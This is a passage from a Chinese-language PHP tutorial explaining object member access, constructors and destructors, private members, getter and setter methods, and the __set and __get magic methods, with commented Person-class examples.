<p>只要是对象中的成员都要使用“对象引用名-&gt;属性”或“对象引用名-&gt;方法”形式访问。如果对象中的成员不是静态的，这是唯一的访问形式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person           //声明一个人类Person，其中包含三个成员属性和两个成员方法</div><div class="line">	&#123;</div><div class="line">		//下面是声明人的三个成员属性</div><div class="line">		var $name;       //第一个成员属性$name定义人的名子</div><div class="line">		var $sex;        //第二个成员性性$sex定义人的性别</div><div class="line">		var $age;        //第三个成员性成定义人的年龄</div><div class="line"></div><div class="line">		//下面是声明人的两个成员方法</div><div class="line">		function say()    //这个人可以说话的方法</div><div class="line">		&#123;</div><div class="line">			echo &quot;这个人在说话&lt;br&gt;&quot;;   //在方法体中可以有更多内容</div><div class="line">		&#125;		</div><div class="line"></div><div class="line">		function run()     //这个人可以走路的方法</div><div class="line">		&#123;</div><div class="line">			echo &quot;这个人在走路&lt;br&gt;&quot;;   //在方法体中可以有更多内容</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//下面三行通过new关键字实例化person类的三个实例对象</div><div class="line">	$person1=new Person();  //通过类Person创建第一个实例对象$person1</div><div class="line">	$person2=new Person();  //通过类person创建第二个实例对象$person2</div><div class="line">	$person3=new Person();  //通过类person创建第三个实例对象$person3</div><div class="line"></div><div class="line">	//下面三行是给$person1对象中属性初使化赋值</div><div class="line">	$person1-&gt;name=&quot;张三&quot;;     //将对象person1中的$name属性赋值为张三 </div><div class="line">	$person1-&gt;sex=&quot;男&quot;;        //将对象person1中的$sex属性赋值为男</div><div class="line">	$person1-&gt;age=20;          //将对象person1中的$age属性赋值为20</div><div class="line"></div><div class="line">	//下面三行是给$person2对象中属性初使化赋值</div><div class="line">	$person2-&gt;name=&quot;李四&quot;;     //将对象person2中的$name属性赋值为李四</div><div class="line">	$person2-&gt;sex=&quot;女&quot;;        //将对象person2中的$sex属性赋值为女</div><div class="line">	$person2-&gt;age=30;          //将对象person2中的$age属性赋值为30</div><div class="line"></div><div class="line">	//下面三行是给$person3对象中属性初使化赋值</div><div class="line">	$person3-&gt;name=&quot;王五&quot;;     //将对象person3中的$name属性赋值为王五</div><div class="line">	$person3-&gt;sex=&quot;男&quot;;        //将对象person3中的$sex属性赋值为男</div><div class="line">	$person3-&gt;age=40;          //将对象person3中的$age属性赋值为40</div><div class="line">	</div><div class="line">	//下面三行是访问$person1对象中的成员属性</div><div class="line">	echo &quot;person1对象的名子是：&quot;.$person1-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person1中的成员属性$name的值</div><div class="line">	echo &quot;person1对象的性别是：&quot;.$person1-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person1中的成员属性$sex的值</div><div class="line">	echo &quot;person1对象的年龄是：&quot;.$person1-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person1中的成员属性$age的值</div><div class="line"></div><div class="line">	//下面两行访问$person1对象中的方法</div><div class="line">	$person1-&gt;say();          //访问第一个对象$person1中的成员方法say(),让第一个人说话</div><div class="line">	$person1-&gt;run();          //访问第一个对象$person1中的成员方法run(),让第一个人走路</div><div class="line"></div><div class="line">	//下面三行是访问$person2对象中的成员属性</div><div class="line">	echo &quot;person2对象的名子是：&quot;.$person2-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person2中的成员属性$name的值</div><div class="line">	echo &quot;person2对象的性别是：&quot;.$person2-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person2中的成员属性$sex的值</div><div class="line">	echo &quot;person2对象的年龄是：&quot;.$person2-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person2中的成员属性$age的值</div><div class="line"></div><div class="line">	//下面两行访问$person2对象中的方法</div><div class="line">	$person2-&gt;say();          //访问第二个对象$person2中的成员方法say(),让第二个人说话</div><div class="line">	$person2-&gt;run();          //访问第二个对象$person2中的成员方法run(),让第二个人走路</div><div class="line"></div><div class="line">	//下面三行是访问$person3对象中的成员属性</div><div class="line">	echo &quot;person3对象的名子是：&quot;.$person3-&gt;name.&quot;&lt;br&gt;&quot;;  //输出对象$person3中的成员属性$name的值</div><div class="line">	echo &quot;person3对象的性别是：&quot;.$person3-&gt;sex.&quot;&lt;br&gt;&quot;;    //输出对象$person3中的成员属性$sex的值</div><div class="line">	echo &quot;person3对象的年龄是：&quot;.$person3-&gt;age.&quot;&lt;br&gt;&quot;;    //输出对象$person3中的成员属性$age的值</div><div class="line"></div><div class="line">	//下面两行访问$person3对象中的方法</div><div class="line">	$person3-&gt;say();          //访问第三个对象$person3中的成员方法say(),让第三个人说话</div><div class="line">	$person3-&gt;run();          //访问第三个对象$person3中的成员方法run(),让第三个人走路</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="构造方法与析构方法"><a href="#构造方法与析构方法" class="headerlink" title="构造方法与析构方法"></a>构造方法与析构方法</h3><p>构造方法是对象创建完成后第一个被对象自动调用的方法，而析构方法是对象在销毁之前最后一个被对象自动调用的方法。</p>
<h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>当创建一个对象时，构造方法就会被自动调用一次，即每次使用关键字new来实例化对象时都会自动调用构造方法，不能主动通过对象的引用调用构造方法。所以通常使用构造方法执行一些有用的初始化任务。<br>在类中声明构造方法和声明其他的成员方法相似，但是构造方法的方法名称必须是以两个下划线开始的“__construct()”，这是PHP5中的变化，在PHP5之前的版本中，构造方法是方法名称必须与类名相同，这种方式在PHP5中仍然可以用。但在PHP5中很少声明和类名同名的构造方法了，这样做的好处是可以使构造函数独立于类名，当类名发生变化时不需要更改相应的构造函数名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">function __construct([参数列表])｛		//构造方法名称是以两个下划线开始的__construct()</div><div class="line">	//方法体，通常用来对成员属性进行初始化赋值</div><div class="line">｝</div></pre></td></tr></table></figure>
<p>在PHP中，同一个类中只能声明一个构造方法。原因是构造方法名称是固定的，在PHP中不能声明同名的两个函数，所以也就没有构造方法重载。但可以在声明构造方法时使用默认参数，实现其他面向对象的编程语言中构造方法重载的功能。这样在创建对象时，如果在构造方法中没有传入参数则使用默认参数为成员属性进行初始化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;         //声明一个人类Person，其中声明一个构造方法</div><div class="line">		//下面是声明人的成员属性，都是没有初值的，在创建对象时，使用构造方法赋初值</div><div class="line">		var $name;       //第一个成员属性$name定义人的名子</div><div class="line">		var $sex;        //第二个成员属性$sex定义人的性别</div><div class="line">		var $age;        //第三个成员属性$age定义人的年龄</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值，参数中都使用了默认参数</div><div class="line">		function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</div><div class="line">			$this-&gt;name = $name;  //在创建对象时，使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;     //在创建对象时，使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;     //在创建对象时，使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//下面是声明人的成员方法</div><div class="line">		function say()&#123; //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line"></div><div class="line">		function run()&#123; //在类中声明另一个方法 </div><div class="line">			echo $this-&gt;name.&quot;在走路&lt;br&gt;&quot;;    //使用$this访问本对象中的$name属性</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//下面三行中实例化person类的三个实例对象，并使用构造方法分别为新创建的对象成员属性赋予初值</div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20); //创建对象$person1时会自动执行构造方法，将全部参数传给它</div><div class="line">	$person2=new Person(&quot;李四&quot;, &quot;女&quot;);    //创建对象$person2时会自动执行构造方法，传入前两个参数</div><div class="line">	$person3=new Person(&quot;王五&quot;);         //创建对象$person3时会自动执行构造方法，只传入一个参数</div><div class="line"></div><div class="line">	$person1-&gt;say();     //使用$person1访问它中的say()方法</div><div class="line">	$person2-&gt;say();     //使用$person2访问它中的say()方法</div><div class="line">	$person3-&gt;say();     //使用$person3访问它中的say()方法</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="析构方法"><a href="#析构方法" class="headerlink" title="析构方法"></a>析构方法</h4><p>PHP将在对象被销毁前自动调用析构方法。析构方法是PHP中新添加的内容，在PHP4中并没有提供。析构方法允许在销毁一个对象之前执行一些特定操作。<br>当堆内存段中的对象失去访问它的引用时，它就不能被访问了，也就称为垃圾对象了。通常对象的引用被赋予其他的值或者是在页面运行结束时，对象都会失去引用。<br>析构方法的声明格式与构造方法相似，在类中声明的析构方法名称也是固定的，也是以两个下划线开头的方法名“__destruct()”，而且析构函数不能带有任何参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">function __destruct()		//析构方法名称是以两个下划线开始的__destruct()</div><div class="line">	//方法体，通常用来完成一些在对象销毁前的清理任务</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;             //声明一个人类Person，其中包含三个成员属性和两个成员方法</div><div class="line">		//下面是声明人的成员属性</div><div class="line">		var $name;          //第一个成员属性$name定义人的名子</div><div class="line">		var $sex;            //第二个成员属性$sex定义人的性别</div><div class="line">		var $age;            //第三个成员属性$age定义人的年龄</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</div><div class="line">		function __construct($name, $sex, $age) &#123;</div><div class="line">			$this-&gt;name = $name;   //在创建对象时，使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;      //在创建对象时，使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;      //在创建对象时，使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//下面是声明人的成员方法</div><div class="line">		function say()&#123;             //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line"></div><div class="line">		function run() &#123;            //在类中声明另一个方法 </div><div class="line">			echo $this-&gt;name.&quot;在走路&lt;br&gt;&quot;;    //使用$this访问本对象中的$name属性</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		function __destruct() &#123;</div><div class="line">			echo &quot;再见&quot;.$this-&gt;name.&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	//下面三行通过new关键字实例化person类的三个实例对象</div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);     //创建对象$person1 </div><div class="line">	$person1=null;              //将第一个对象的引用$person1赋值为其它的值，第一个对象将失去引用</div><div class="line">	$person2=new Person(&quot;李四&quot;, &quot;女&quot;, 30);     //创建对象$person2 </div><div class="line">	$person3=new Person(&quot;王五&quot;, &quot;男&quot;, 40);      //创建对象$person3 </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="封装性"><a href="#封装性" class="headerlink" title="封装性"></a>封装性</h2><p>封装性就是把对象的成员属性和成员方法结合成一个独立的相同单位，并尽可能隐蔽对象的内部细节，包含两个含义：</p>
<ul>
<li>把对象的全部成员属性和全部成员方法结合在一起，形参一个不可分隔的独立单位（即对象）。</li>
<li>信息隐蔽，即尽可能隐蔽对象的内部细节，对外形成一个边界，只保留有限的对外接口使之与外部发生联系。</li>
</ul>
<h3 id="设置私有成员"><a href="#设置私有成员" class="headerlink" title="设置私有成员"></a>设置私有成员</h3><p>只要在声明成员属性或成员方法时，使用private关键字修饰就实现了对成员的封装。封装后的成员在对象的外部不能被访问，但在对象内部的成员方法中可以访问到自己对象内部被封装的成员属性和被封装的成员方法。达到了对对象成员保护的目的，只能是对象自己使用，其他人不可以访问自己的私有成员。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</div><div class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</div><div class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</div><div class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</div><div class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</div><div class="line">	     	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</div><div class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function run()&#123;              //在类中声明一个走路方法，调用两个内部的私有方法完成</div><div class="line">			echo $this-&gt;name.&quot;在走路时&quot;.$this-&gt;leftLeg().&quot;再&quot;.$this-&gt;rightLeg().&quot;&lt;br&gt;&quot;;	</div><div class="line">		&#125;</div><div class="line">         </div><div class="line">		private function leftLeg() &#123;    //声明一个迈左腿的方法，被封装所以只能在内部使用</div><div class="line">			return &quot;迈左腿&quot;;</div><div class="line">		&#125;</div><div class="line">         </div><div class="line">		private function rightLeg() &#123;   //声明一个迈右腿的方法，被封装所以只能在内部使用</div><div class="line">			return &quot;迈右腿&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	$person1=new Person();         //创建对象$person1 </div><div class="line">	$person1-&gt;run();               //run()的方法没有被封装，所以可以在对象外部使用</div><div class="line">	$person1-&gt;name=&quot;李四&quot;;        //name属性被封装，不能在对象外部给私有属性赋值</div><div class="line">	echo $person1-&gt;age;            //age属性被封装，不能在对象的外部获取私有属性的值</div><div class="line">	$person1-&gt;leftLeg();            //leftLeg()方法被封装，不能在对象外面调用对象中私有的方法</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="私有成员的访问"><a href="#私有成员的访问" class="headerlink" title="私有成员的访问"></a>私有成员的访问</h3><p>对象中的成员属性一旦被private关键字封装成私有以后，就只能在对象内部的成员方法中使用。不能被对象外部直接赋值，也不能在对象外部直接获取私有属性的值。如果不让用户在对象外部设置私有属性的值，但可以获取私有属性的值。或者允许用户对私有属性赋值，但需要限制一些赋值的条件。解决方法就是在对象的内部声明一些操作私有属性的方法，再把这个方法通过public关键字设置为共有的访问权限。如果成员方法没有加任何访问控制修饰，默认就是public的，在任何地方都可以访问。这样，在对象外部就可以通过公有的方法作为访问接口，间接地访问对象内部私有成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</div><div class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</div><div class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</div><div class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</div><div class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员私有属性赋予初值</div><div class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</div><div class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		public  function getName() &#123;   //通过这个公有方法可以在对象外部获取私有属性$name的值</div><div class="line">			return $this-&gt;name;      //返回对象的私有属性的值</div><div class="line">		&#125;</div><div class="line">		</div><div class="line">		public function setSex($sex) &#123;  //通过这个公有方法在对象外部为私有属性$sex设置值，但限制条件</div><div class="line">			if($sex==&quot;男&quot; || $sex==&quot;女&quot;)   //如果传入合法的值才为私有的属性赋值</div><div class="line">				$this-&gt;sex=$sex;        //条成立则将参数传入的值赋给私有属性</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		public function setAge($age) &#123; //通过这个公有方法在对象外部为私有属性$age设置值，但限制条件</div><div class="line">			if($age &gt; 150 || $age &lt;0)      //如果设置不合理的年龄则函数不往下执行</div><div class="line">				return;                //返回空值，退出函数</div><div class="line">			$this-&gt;age=$age;            //执行此语句则重新为私有属性赋值</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		public function getAge()&#123;    //通过这个公有方法可以在对象外部获取私有属性$name的值</div><div class="line">			if($this-&gt;age &gt; 30)           //如果年龄的成员属性大于30则返回虚假的年龄</div><div class="line">				return $this-&gt;age-10;     //返回当前的年龄减去10岁</div><div class="line">			else                       //如果年龄在30岁以下则返回真实年龄</div><div class="line">				return $this-&gt;age;       //返回当前的私有年龄属</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		//下面是声明人的成员公有方法，说出自己所有的私有属性</div><div class="line">		function say()&#123;   //在类中声明说话的方法，使用$this访问自已对象内部的成员属性</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$person1=new Person(&quot;王五&quot;, &quot;男&quot;, 40);  //创建对象$person1</div><div class="line">	echo $person1-&gt;getName().&quot;&lt;br&gt;&quot;;      //访问对象中的公有方法，获取对象中私有属性$name输出</div><div class="line">	$person1-&gt;setSex(&quot;女&quot;);               //通过公有的方法为私有属性$sex设置合法的值</div><div class="line">	$person1-&gt;setAge(200);               //通过公有的方法为私有属性$age设置非法的值，赋值失败</div><div class="line">	echo $person1-&gt;getAge().&quot;&lt;br&gt;&quot;;       //访问对象中的公有方法，获取对象中私有属性$age输出</div><div class="line">	$person1-&gt;say();                    //访问对象中的公有方法，获取对象中所有的私有属性并输出</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="set-、get-、isset-和unset-四种方法"><a href="#set-、get-、isset-和unset-四种方法" class="headerlink" title="set()、get()、isset()和unset()四种方法"></a><strong>set()、</strong>get()、<strong>isset()和</strong>unset()四种方法</h3><p>在PHP5.1.0以后的版本中，预定义了两个方法“get()”和“set()”，用来完成对所有私有属性都能获取和赋值的操作，以及用来检查私有属性是否存在的方法“isset”和用来删除对象中私有属性的方法“unset()”.(以两个下划线开始)</p>
<h4 id="魔术方法-set"><a href="#魔术方法-set" class="headerlink" title="魔术方法__set()"></a>魔术方法__set()</h4><p>类中声明格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void __set(string name,mixed value)     //是以两个下划线开始的方法名，方法体的内容需要自定义</div></pre></td></tr></table></figure></p>
<p>该方法的作用是在程序运行过程中为私有的成员属性设置值，它不需要有任何返回值。但它需要两个参数，第一个参数需要传入在为私有属性设置值时的属性名，第二个参数则需要传入为属性设置的值。而且这个方法不需要我们主动调用，可以在方法前面也加上private关键字修饰，防止用户直接去调用它。这个方法是在用户值为私用属性设置值时自动调用的。如果不在类中添加这个方法而直接为私有属性赋值，则会出现“不能访问某个私有属性”的错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</div><div class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</div><div class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</div><div class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</div><div class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</div><div class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</div><div class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line">		//声明魔术方法需要两个参数，真接为私有属性赋值时自动调用，并可以屏蔽一些非法赋值</div><div class="line">		private function __set($propertyName, $propertyValue) &#123; </div><div class="line">			if($propertyName==&quot;sex&quot;)&#123;        //如果第一个参数是属性名sex则条件成立</div><div class="line">				if(!($propertyValue == &quot;男&quot; || $propertyValue == &quot;女&quot;))  //第二个参数只能是男或女</div><div class="line">					return;                //如果是非法参数返回空，则结束方法执行</div><div class="line">			&#125;	</div><div class="line"></div><div class="line">			if($propertyName==&quot;age&quot;)&#123;        //如果第一个参数是属性名age则条件成立</div><div class="line">				if($propertyValue &gt; 150 || $propertyValue &lt;0)  //第二个参数只能在0到150之间的整数</div><div class="line">					return;                //如果是非法参数返回空，则结束方法执行</div><div class="line">			&#125;</div><div class="line">              //根据参数决定为那个属性被赋值，传入不同的成员属性名，赋上传入的相应的值</div><div class="line">			$this-&gt;$propertyName = $propertyValue; </div><div class="line">		&#125; </div><div class="line">		</div><div class="line">		//下面是声明人类的成员方法,设置为公有的可以在任何地方访问</div><div class="line">		public function say()&#123; //在类中声明说话的方法，将所有的私有属性说出</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 20); </div><div class="line">	//自动调用了__set()函数，将属性名name传给第一个参数，将属性值”李四”传给第二个参数</div><div class="line">	$person1-&gt;name=&quot;李四&quot;;     //赋值成功</div><div class="line">	//自动调用了__set()函数，将属性名sex传给第一个参数，将属性值”女”传给第二个参数</div><div class="line">	$person1-&gt;sex=&quot;女&quot;;         //赋值成功</div><div class="line">   	//自动调用了__set()函数，将属性名age传给第一个参数，将属性值80传给第二个参数</div><div class="line">	$person1-&gt;age=80;          //赋值成功</div><div class="line">	</div><div class="line">	$person1-&gt;sex=&quot;保密&quot;;       //“保密”是一个非法值，这条语句给私有属性sex赋值失败</div><div class="line">	$person1-&gt;age=800;         //800是一个非法值，这条语句私有属生age赋值失败</div><div class="line"></div><div class="line">	$person1-&gt;say();	           //调用$person1对象中的say()方法，查看一下所有被重新设置的新值</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="魔法方法-get"><a href="#魔法方法-get" class="headerlink" title="魔法方法__get()"></a>魔法方法__get()</h4><p>在类中声明的格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mixed __get(string name)</div></pre></td></tr></table></figure></p>
<p>该方法的作用是在程序运行过程中，通过它可以在对象的外部获取私有成员后苏醒的值。它有一个必选的参数，需要传入在获取私有属性值时的属性名，并返回一个值，是在这个方法处理后的允许对象外部使用的值。而且这个方法也不需要我们主动调用，也可以在方法前面加上private关键字修饰，防止用户直接去调用它。如果不在类中添加这个方法而直接获取私有属性的值，也会出现”不能访问某个私有属性”的错误。</p>
